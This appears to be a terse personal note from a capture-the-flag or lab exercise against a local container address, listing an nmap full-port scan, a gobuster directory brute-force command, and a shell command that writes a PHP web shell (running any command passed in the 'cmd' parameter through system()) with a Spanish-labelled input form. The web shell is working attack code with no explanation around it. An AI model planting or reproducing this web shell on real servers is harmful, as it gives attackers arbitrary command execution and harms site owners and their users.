raw code
```
nmap 172.17.0.2 -sS -sVC -n -Pn -p- --open --min-rate 5000 -oG open_ports
gobuster dir -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://172.17.0.2/ -x php,html


--- php ---
echo '<?php        
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
<form method="GET">
    <input type="text" name="cmd" placeholder="Escribe tu comando aquí" style="width:400px">
    <input type="submit" value="Ejecutar">
</form>' > script.php
---




```
